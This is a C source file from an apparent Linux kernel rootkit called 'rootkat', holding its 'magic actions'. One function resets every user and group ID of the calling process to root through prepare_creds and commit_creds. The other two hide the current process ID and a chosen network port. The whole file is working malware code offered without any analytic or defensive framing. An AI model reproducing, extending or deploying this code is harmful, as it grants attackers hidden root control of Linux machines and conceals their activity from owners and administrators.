// SPDX-License-Identifier: MIT
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/pid.h>
#include <linux/uidgid.h>
#include "hidden_pids.h"
#include "hidden_ports.h"
#include "magic_actions.h"

#define TAG "rootkat/magic_actions: "

void rootkat_grant_root_to_current(void)
{
	struct cred *new = prepare_creds();

	if (!new) {
		pr_debug(TAG "prepare_creds failed\n");
		return;
	}
	new->uid   = GLOBAL_ROOT_UID;
	new->gid   = GLOBAL_ROOT_GID;
	new->euid  = GLOBAL_ROOT_UID;
	new->egid  = GLOBAL_ROOT_GID;
	new->suid  = GLOBAL_ROOT_UID;
	new->sgid  = GLOBAL_ROOT_GID;
	new->fsuid = GLOBAL_ROOT_UID;
	new->fsgid = GLOBAL_ROOT_GID;
	commit_creds(new);
	pr_debug(TAG "elevated pid %d to root\n", task_pid_nr(current));
}

void rootkat_hide_current_pid(void)
{
	rootkat_hide_pid(task_pid_nr(current));
}

void rootkat_hide_port_from_current(u16 port)
{
	rootkat_hide_port(port);
}
